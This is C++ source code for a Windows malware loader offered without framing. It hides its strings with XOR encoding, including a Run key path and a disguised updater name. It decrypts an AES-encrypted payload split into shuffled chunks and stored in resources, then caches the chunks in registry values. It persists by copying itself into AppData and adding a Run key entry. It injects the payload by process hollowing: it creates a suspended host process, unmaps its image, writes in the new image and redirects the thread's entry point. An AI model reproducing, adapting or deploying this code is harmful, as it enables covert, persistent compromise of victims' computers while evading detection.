#include <windows.h>
#include <cstdint>
#include <vector>
#include <wincrypt.h>
#include <string>
#include <algorithm>
#include <random>
#include <shlwapi.h>
#include <shlobj.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

#define MVAL 0x474E5089

#pragma pack(push, 1)
struct PIndex {
    uint32_t mval = MVAL;
    uint8_t  fkey;
    uint32_t tsize;
    uint16_t ccount;
    uint16_t fchkid;
    uint32_t crc32;
    uint16_t shseed;
};
#pragma pack(pop)

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

unsigned char encCIDSMRU[] = {
    0xAA, 0xF8, 0xAC, 0xC2, 0xAE, 0xC9, 0xB0, 0xC5, 0xB2, 0xC4, 0xB4, 0xD4, 0xB6, 0xC5, 0xB8, 0xDC,
    0xBA, 0xE7, 0xBC, 0xF0, 0xBE, 0xD6, 0xC0, 0xA2, 0xC2, 0xB1, 0xC4, 0xAA, 0xC6, 0xB4, 0xC8, 0xA6,
    0xCA, 0xAD, 0xCC, 0xB9, 0xCE, 0x93, 0xD0, 0x86, 0xD2, 0xBA, 0xD4, 0xBB, 0xD6, 0xB3, 0xD8, 0xB6,
    0xDA, 0xAC, 0xDC, 0xAE, 0xDE, 0x83, 0xE0, 0xA2, 0xE2, 0x96, 0xE4, 0x97, 0xE6, 0x95, 0xE8, 0x8C,
    0xEA, 0x85, 0xEC, 0x99, 0xEE, 0xB9, 0xF0, 0x94, 0xF2, 0x81, 0xF4, 0x86, 0xF6, 0x9E, 0xF8, 0x96,
    0xFA, 0x95, 0xFC, 0xA1, 0xFE, 0xBA, 0x00, 0x79, 0x02, 0x73, 0x04, 0x69, 0x06, 0x68, 0x08, 0x7B,
    0x0A, 0x6E, 0x0C, 0x7F, 0x0E, 0x53, 0x10, 0x52, 0x12, 0x7C, 0x14, 0x78, 0x16, 0x53, 0x18, 0x75,
    0x1A, 0x7C, 0x1C, 0x2E, 0x1E, 0x2D, 0x20, 0x7D, 0x22, 0x60, 0x24, 0x6C, 0x26, 0x63, 0x28, 0x7A,
    0x2A, 0x42, 0x2C, 0x57, 0x2E, 0x4A, 0x30, 0x7C, 0x32, 0x61, 0x34, 0x60, 0x36, 0x37
};
unsigned char encRunK[] = {
    0xAA, 0xF8, 0xAC, 0xC2, 0xAE, 0xC9, 0xB0, 0xC5, 0xB2, 0xC4, 0xB4, 0xD4, 0xB6, 0xC5, 0xB8, 0xDC,
    0xBA, 0xE7, 0xBC, 0xF0, 0xBE, 0xD6, 0xC0, 0xA2, 0xC2, 0xB1, 0xC4, 0xAA, 0xC6, 0xB4, 0xC8, 0xA6,
    0xCA, 0xAD, 0xCC, 0xB9, 0xCE, 0x93, 0xD0, 0x86, 0xD2, 0xBA, 0xD4, 0xBB, 0xD6, 0xB3, 0xD8, 0xB6,
    0xDA, 0xAC, 0xDC, 0xAE, 0xDE, 0x83, 0xE0, 0xA2, 0xE2, 0x96, 0xE4, 0x97, 0xE6, 0x95, 0xE8, 0x8C,
    0xEA, 0x85, 0xEC, 0x99, 0xEE, 0xB9, 0xF0, 0x94, 0xF2, 0x81, 0xF4, 0x86, 0xF6, 0x9E, 0xF8, 0x96,
    0xFA, 0x95, 0xFC, 0xA1, 0xFE, 0xAD, 0x00, 0x74, 0x02, 0x6D, 0x04, 0x05
};

unsigned char encNotepadDerived[] = {
    0xAA, 0xE8, 0xAC, 0x97, 0xAE, 0xF3, 0xB0, 0xE6, 0xB2, 0xDA, 0xB4, 0xDB, 0xB6, 0xD3, 0xB8, 0xD6,
    0xBA, 0xCC, 0xBC, 0xCE, 0xBE, 0xE3, 0xC0, 0x92, 0xC2, 0xBA, 0xC4, 0xB6, 0xC6, 0xB3, 0xC8, 0xAC,
    0xCA, 0xA6, 0xCC, 0xFE, 0xCE, 0xFD, 0xD0, 0x8D, 0xD2, 0xBD, 0xD4, 0xBA, 0xD6, 0xA3, 0xD8, 0xBC,
    0xDA, 0xAB, 0xDC, 0xBC, 0xDE, 0xBB, 0xE0, 0xCF, 0xE2, 0x86, 0xE4, 0x9D, 0xE6, 0x82
};
unsigned char encUpHelpName[] = {
    0xAA, 0xFC, 0xAC, 0xC4, 0xAE, 0xC1, 0xB0, 0xD5, 0xB2, 0xDC, 0xB4, 0xC2, 0xB6, 0xC4, 0xB8, 0xEC,
    0xBA, 0xCB, 0xBC, 0xD9, 0xBE, 0xDE, 0xC0, 0xB5, 0xC2, 0xA6, 0xC4, 0x8D, 0xC6, 0xA2, 0xC8, 0xA5,
    0xCA, 0xBB, 0xCC, 0xA8, 0xCE, 0xBD, 0xD0, 0xD1
};

unsigned char encExp[] = {
    0xAA, 0xEE, 0xAC, 0xD5, 0xAE, 0xDF, 0xB0, 0xDD, 0xB2, 0xDC, 0xB4, 0xC7, 0xB6, 0xD2, 0xB8, 0xCB,
    0xBA, 0xBB
};

unsigned char encFolFile[] = {
    0xAA, 0xE6, 0xAC, 0xC4, 0xAE, 0xCC, 0xB0, 0xC3, 0xB2, 0xDC, 0xB4, 0xC6, 0xB6, 0xD8, 0xB8, 0xDF,
    0xBA, 0xCF, 0xBC, 0xE1, 0xBE, 0xE8, 0xC0, 0xA8, 0xC2, 0xAD, 0xC4, 0xA1, 0xC6, 0xA8, 0xC8, 0xBE,
    0xCA, 0xB8, 0xCC, 0x91, 0xCE, 0x98, 0xD0, 0xB8, 0xD2, 0xBD, 0xD4, 0xB1, 0xD6, 0xB8, 0xD8, 0xAE,
    0xDA, 0xA8, 0xDC, 0x88, 0xDE, 0xAF, 0xE0, 0x85, 0xE2, 0x82, 0xE4, 0x91, 0xE6, 0x82, 0xE8, 0xA1,
    0xEA, 0x8E, 0xEC, 0x81, 0xEE, 0x9F, 0xF0, 0x94, 0xF2, 0x81, 0xF4, 0xDB, 0xF6, 0x92, 0xF8, 0x81,
    0xFA, 0x9E, 0xFC, 0xFD
};

std::wstring GetDecWString(const unsigned char* encBuf, size_t dataLen, unsigned char key = 0xAA) {
    std::vector<wchar_t> result;
    for (size_t i = 0; i + 1 < dataLen; i += 2) {
        unsigned char b1 = encBuf[i]     ^ (key + static_cast<unsigned char>(i));
        unsigned char b2 = encBuf[i + 1] ^ (key + static_cast<unsigned char>(i + 1));
        wchar_t wc = (static_cast<wchar_t>(b1) << 8) | b2;
        if (wc == L'\0') break;
        result.push_back(wc);
    }
    result.push_back(L'\0');
    std::wstring wstr = std::wstring(result.begin(), result.end());
    return wstr;
}

static const char* resTypeRCDATA = "RCDATA";

unsigned char* LoadResBID(int id, DWORD* size) {    
    HMODULE hMod = GetModuleHandle(NULL);
    if (!hMod) {
        return nullptr;
    }
    
    
 
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), resTypeRCDATA);
    if (!hRes) {
        
        hRes = FindResourceW(hMod, MAKEINTRESOURCEW(id), L"RCDATA");
        if (!hRes) {
        } else {
        }
    } else {
    }
    
    if (!hRes) {
        *size = 0;
        return nullptr;
    }
    
   
    *size = SizeofResource(hMod, hRes);
    if (*size == 0) {
        DWORD err = GetLastError();
        return nullptr;
    }
    
    
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) {
        DWORD err = GetLastError();
        *size = 0;
        return nullptr;
    }
    
    unsigned char* data = (unsigned char*)LockResource(hGlob);
    if (!data) {
        DWORD err = GetLastError();
        *size = 0;
        return nullptr;
    }
        
    return data;
}

uint32_t CalCR32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    uint32_t result = ~crc;
    return result;
}

bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
    
    if (pbuf.size() != esize) {
        return false;
    }
    
    uint32_t actual_crc = CalCR32(pbuf.data(), pbuf.size());
    if (actual_crc != ecrc) {
        return false;
    }
    
    return true;
}

bool RegFE() {
    HKEY hKey;
    std::wstring cidPath = GetDecWString(encCIDSMRU, sizeof(encCIDSMRU));
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        DWORD err = GetLastError();
        return false;
    }
    
    std::wstring iName = GetDecWString(encExp, sizeof(encExp));
    DWORD size = 0;
    bool indexExists = (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
    
    if (!indexExists) {
        DWORD err = GetLastError();
    } else {
    }
    
    RegCloseKey(hKey);
    return indexExists;
}

bool StoreFIR(const PIndex& index, const std::vector<std::vector<BYTE>>& eChks) {
    
    HKEY hKey;
    DWORD disposition;
    std::wstring cidPath = GetDecWString(encCIDSMRU, sizeof(encCIDSMRU));
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
        DWORD err = GetLastError();
        return false;
    }
    
    std::wstring iName = GetDecWString(encExp, sizeof(encExp));
    if (RegSetValueExW(hKey, iName.c_str(), 0, REG_BINARY, (BYTE*)&index, sizeof(PIndex)) != ERROR_SUCCESS) {
        DWORD err = GetLastError();
        RegCloseKey(hKey);
        return false;
    }
    
    for (size_t i = 0; i < eChks.size(); ++i) {
        std::wstring chkName = L"item" + std::to_wstring(i);
        if (RegSetValueExW(hKey, chkName.c_str(), 0, REG_BINARY, eChks[i].data(), (DWORD)eChks[i].size()) != ERROR_SUCCESS) {
            DWORD err = GetLastError();
            RegCloseKey(hKey);
            return false;
        }
    }
    
    RegCloseKey(hKey);
    return true;
}

std::vector<char> LoadFFR() {
    
    HKEY hKey;
    std::wstring cidPath = GetDecWString(encCIDSMRU, sizeof(encCIDSMRU));
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        DWORD err = GetLastError();
        return {};
    }
    
    std::wstring iName = GetDecWString(encExp, sizeof(encExp));
    DWORD size = sizeof(PIndex);
    PIndex index;
    
    if (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, (BYTE*)&index, &size) != ERROR_SUCCESS) {
        DWORD err = GetLastError();
        RegCloseKey(hKey);
        return {};
    }
    
    
    if (index.mval != MVAL) {
        RegCloseKey(hKey);
        return {};
    }
    
    std::vector<std::vector<BYTE>> shEncChks(index.ccount);
    
    for (int i = 0; i < index.ccount; ++i) {
        std::wstring chkName = L"item" + std::to_wstring(i);
        DWORD chkSize = 0;
        
        if (RegQueryValueExW(hKey, chkName.c_str(), NULL, NULL, NULL, &chkSize) != ERROR_SUCCESS) {
            DWORD err = GetLastError();
            RegCloseKey(hKey);
            return {};
        }
        
        shEncChks[i].resize(chkSize);
        
        if (RegQueryValueExW(hKey, chkName.c_str(), NULL, NULL, shEncChks[i].data(), &chkSize) != ERROR_SUCCESS) {
            DWORD err = GetLastError();
            RegCloseKey(hKey);
            return {};
        }
    }
    
    RegCloseKey(hKey);
    
    std::vector<int> chk_order(index.ccount);
    for (int i = 0; i < index.ccount; ++i) chk_order[i] = i;
    std::mt19937 rng(index.shseed);
    std::shuffle(chk_order.begin(), chk_order.end(), rng);
    
    std::vector<std::vector<BYTE>> eChks(index.ccount);
    for (int reg_pos = 0; reg_pos < index.ccount; ++reg_pos) {
        int logical_idx = chk_order[reg_pos];
        eChks[logical_idx] = std::move(shEncChks[reg_pos]);
    }
    
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize + 1024);
    
    
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        DWORD err = GetLastError();
        return {};
    }
    
    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
    
    BYTE lst_ciph_blk[16] = {0};
    
    for (int i = 0; i < index.ccount; ++i) {
        const auto& enc_buf = eChks[i];
        DWORD chunk_size = (DWORD)enc_buf.size();
        
        
        BYTE iv[16] = {0};
        if (i > 0) {
            memcpy(iv, lst_ciph_blk, 16);
        }
        
        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};
        keyblob.hdr.bType = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize = 32;
        memcpy(keyblob.key, aes_key, 32);
        
        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            DWORD err = GetLastError();
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            DWORD err = GetLastError();
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        std::vector<BYTE> decbuf(enc_buf.begin(), enc_buf.end());
        DWORD out_len = chunk_size;
        
        if (!CryptDecrypt(hKey, 0, FALSE, 0, decbuf.data(), &out_len)) {
            DWORD err = GetLastError();
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        CryptDestroyKey(hKey);
        
        if (chunk_size >= 16) {
            memcpy(lst_ciph_blk, enc_buf.data() + chunk_size - 16, 16);
        }
        
        if (out_len > 0) {
            BYTE pad = decbuf[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (decbuf[out_len - 1 - j] != pad) {
                        valid = false;
                        break;
                    }
                }
                if (valid) {
                    out_len -= pad;
                }
            }
        }
        
        pbuf.insert(pbuf.end(), (char*)decbuf.data(), (char*)decbuf.data() + out_len);
    }
    
    CryptReleaseContext(hProv, 0);
    
    if (!VerPay(pbuf, index.crc32, index.tsize)) {
        return {};
    }
    
    return pbuf;
}

std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
    
    DWORD iSize = 0;
    unsigned char* idata = LoadResBID(999, &iSize);
    
    if (!idata) {
        return {};
    }
    
    
    if (iSize < sizeof(PIndex)) {
        return {};
    }
    
    PIndex* idx = (PIndex*)idata;
    
    if (idx->mval != MVAL) {
        return {};
    }
    
    std::vector<std::vector<BYTE>> shEChks;
    
    for (int respos = 0; respos < idx->ccount; ++respos) {
        int resId = idx->fchkid + respos;
        DWORD chksize = 0;
        
        unsigned char* encbuf = LoadResBID(resId, &chksize);
        
        if (encbuf && chksize > 0) {
            std::vector<BYTE> chunk(encbuf, encbuf + chksize);
            shEChks.push_back(chunk);
        } else {
            return {};
        }
    }
    
    if (shEChks.size() != idx->ccount) {
        return {};
    }
    
    
    std::vector<int> chkOrdr(idx->ccount);
    for (int i = 0; i < idx->ccount; ++i) chkOrdr[i] = i;
    
    std::mt19937 rng(idx->shseed);
    std::shuffle(chkOrdr.begin(), chkOrdr.end(), rng);
    
    std::vector<std::vector<BYTE>> eChks(idx->ccount);
    for (int r_pos = 0; r_pos < idx->ccount; ++r_pos) {
        int log_idx = chkOrdr[r_pos];
        eChks[log_idx] = std::move(shEChks[r_pos]);
    }
    
    return {*idx, eChks};
}

bool ChckPrs() {
    std::wstring runKPth = GetDecWString(encRunK, sizeof(encRunK));
    std::wstring regVNm = GetDecWString(encUpHelpName, sizeof(encUpHelpName));
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKPth.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        DWORD err = GetLastError();
        return false;
    }
    
    DWORD size = 0;
    bool exists = (RegQueryValueExW(hKey, regVNm.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
        
    RegCloseKey(hKey);
    return exists;
}

bool CopySTPL() {
    std::wstring runKPth = GetDecWString(encRunK, sizeof(encRunK));
    std::wstring regVNm = GetDecWString(encUpHelpName, sizeof(encUpHelpName));
    std::wstring foldFle = GetDecWString(encFolFile, sizeof(encFolFile));
    
    wchar_t currPth[MAX_PATH], appDPath[MAX_PATH], tgtPath[MAX_PATH];
    GetModuleFileNameW(NULL, currPth, MAX_PATH);
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDPath);
    wcscpy_s(tgtPath, appDPath);
    PathAppendW(tgtPath, foldFle.c_str());
    
    
    wchar_t dirPath[MAX_PATH];
    wcscpy_s(dirPath, tgtPath);
    PathRemoveFileSpecW(dirPath);
    SHCreateDirectoryExW(NULL, dirPath, NULL);
    
    if (_wcsicmp(currPth, tgtPath) != 0) {
        if (CopyFileW(currPth, tgtPath, FALSE)) {
        } else {
            DWORD err = GetLastError();
        }
    } else {
    }
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKPth.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        std::wstring value = L"\"" + std::wstring(tgtPath) + L"\"";
        if (RegSetValueExW(hKey, regVNm.c_str(), 0, REG_SZ,
                           (BYTE*)value.c_str(), (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        } else {
            DWORD err = GetLastError();
        }
        RegCloseKey(hKey);
    } else {
        DWORD err = GetLastError();
    }
    
    return false;
}

std::vector<char> RecFWRP() {
    
    if (!ChckPrs()) {
        CopySTPL();
    } 
    
    if (RegFE()) {
        auto rPBuf = LoadFFR();
        if (!rPBuf.empty()) {
            return rPBuf;
        } else {
        }
    } else {
    }
    
    auto [index, enChksLog] = LoadEFR();
    if (enChksLog.empty()) {
        return {};
    }
    
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize + 1024);
    
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        DWORD err = GetLastError();
        return {};
    }
    
    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
    
    BYTE last_cipher_block[16] = {0};
    
    for (int i = 0; i < index.ccount; ++i) {
        const auto& enc_buf = enChksLog[i];
        DWORD chk_s = (DWORD)enc_buf.size();
        
        BYTE iv[16] = {0};
        if (i > 0) memcpy(iv, last_cipher_block, 16);
        
        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};
        keyblob.hdr.bType = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize = 32;
        memcpy(keyblob.key, aes_key, 32);
        
        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            DWORD err = GetLastError();
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            DWORD err = GetLastError();
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        std::vector<BYTE> dec(enc_buf.begin(), enc_buf.end());
        DWORD out_len = chk_s;
        
        if (!CryptDecrypt(hKey, 0, FALSE, 0, dec.data(), &out_len)) {
            DWORD err = GetLastError();
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }
        
        CryptDestroyKey(hKey);
        
        if (chk_s >= 16) memcpy(last_cipher_block, enc_buf.data() + chk_s - 16, 16);
        
        if (out_len > 0) {
            BYTE pad = dec[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (dec[out_len - 1 - j] != pad) { valid = false; break; }
                }
                if (valid) {
                    out_len -= pad;
                }
            }
        }
        
        pbuf.insert(pbuf.end(), (char*)dec.data(), (char*)dec.data() + out_len);
    }
    
    CryptReleaseContext(hProv, 0);
    
    if (!VerPay(pbuf, index.crc32, index.tsize)) {
        return {};
    }
    
    StoreFIR(index, enChksLog);
    
    return pbuf;
}

bool Start(char* pay_buf, uint32_t pay_buf_size) {
    BYTE* pe = (BYTE*)pay_buf;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }
    
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    std::wstring hostPathW =  GetDecWString(encNotepadDerived, sizeof(encNotepadDerived));
  
    BOOL isWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isWow64);
 
    wchar_t cmdLine[MAX_PATH];
    wcscpy_s(cmdLine, hostPathW.c_str());
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    
    if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        return false;
    }
    
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        DWORD err = GetLastError();
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG returnLen = 0;
    
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, int, PVOID, ULONG, PULONG);
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    
    ULONGLONG originalBaseAddress = 0;
    if (NtQueryInformationProcess) {
        if (NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLen) == 0) {
                SIZE_T bytesRead = 0;
                ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 0x10, 
                &originalBaseAddress, sizeof(originalBaseAddress), &bytesRead);
        } 
    }
    
  
    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection && originalBaseAddress) {
        NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)originalBaseAddress);
    
    }
    
    
    ULONGLONG preferredBase = nt->OptionalHeader.ImageBase;
    
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, 
                                       (LPVOID)preferredBase,
                                       nt->OptionalHeader.SizeOfImage,
                                       MEM_COMMIT | MEM_RESERVE, 
                                       PAGE_EXECUTE_READWRITE);
    
    if (!remoteImage) {
        DWORD err = GetLastError();
        
        remoteImage = VirtualAllocEx(pi.hProcess, NULL,
                                    nt->OptionalHeader.SizeOfImage,
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_EXECUTE_READWRITE);
        if (!remoteImage) {
            DWORD err2 = GetLastError();
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }
    }
    
    
    ULONGLONG delta = (ULONGLONG)remoteImage - preferredBase;
    
    std::vector<BYTE> pay_bufCopy(pay_buf, pay_buf + pay_buf_size);
    BYTE* relPE = pay_bufCopy.data();
    
    if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(relPE + relocDir.VirtualAddress);
        DWORD relocCount = 0;
        
        while ((BYTE*)reloc < relPE + relocDir.VirtualAddress + relocDir.Size) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* relocData = (WORD*)(reloc + 1);
            
            for (DWORD i = 0; i < count; ++i) {
                DWORD type = relocData[i] >> 12;
                DWORD offset = relocData[i] & 0xFFF;
                
                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patchAddr = (ULONGLONG*)(relPE + reloc->VirtualAddress + offset);
                    if ((ULONGLONG)patchAddr < (ULONGLONG)relPE +pay_buf_size) {
                        *patchAddr += delta;
                        relocCount++;
                    }
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD* patchAddr = (DWORD*)(relPE + reloc->VirtualAddress + offset);
                    if ((ULONGLONG)patchAddr < (ULONGLONG)relPE + pay_buf_size) {
                        *patchAddr += (DWORD)delta;
                        relocCount++;
                    }
                }
            }
            
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }
        
    } else {
    }
    
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteImage, relPE, 
                           nt->OptionalHeader.SizeOfHeaders, &written)) {
        DWORD err = GetLastError();
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
        LPVOID src = relPE + sections[i].PointerToRawData;
        
        if (sections[i].SizeOfRawData > 0) {
            
            if (!WriteProcessMemory(pi.hProcess, dest, src, 
                                   sections[i].SizeOfRawData, &written)) {
                DWORD err = GetLastError();
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }
            
        }
        
        DWORD oldProtect;
        DWORD newProtect = PAGE_EXECUTE_READWRITE;
        
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                newProtect = PAGE_EXECUTE_READWRITE;
            }
            else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) {
                newProtect = PAGE_EXECUTE_READ;
            }
            else {
                newProtect = PAGE_EXECUTE;
            }
        }
        else if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            newProtect = PAGE_READWRITE;
        }
        else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) {
            newProtect = PAGE_READONLY;
        }
        
        if (VirtualProtectEx(pi.hProcess, dest, sections[i].Misc.VirtualSize, newProtect, &oldProtect)) {
        } else {
            DWORD err = GetLastError();
        }
    }
    
    if (pbi.PebBaseAddress) {
        
    PVOID pebImgB = (BYTE*)pbi.PebBaseAddress + 0x10;
        
        SIZE_T bytesWritten = 0;
        if (WriteProcessMemory(pi.hProcess, pebImgB, &remoteImage, sizeof(remoteImage), &bytesWritten)) {
        } else {
            DWORD err = GetLastError();
        }
    } 
    
    ULONGLONG newEntPnt = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
    ctx.Rip = newEntPnt;
    
    ctx.Rcx = newEntPnt;
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        DWORD err = GetLastError();
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    
    
    if (FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage)) {
    } else {
        DWORD err = GetLastError();
    }
    
    if (ResumeThread(pi.hThread) != (DWORD)-1) {
    } else {
        DWORD err = GetLastError();
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return true;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto pbuf = RecFWRP();
    if (pbuf.empty()) {
        return -1;
    }
    
    if (!Start(pbuf.data(), (uint32_t)pbuf.size())) {
        return -1;
    }    
    return 0;
}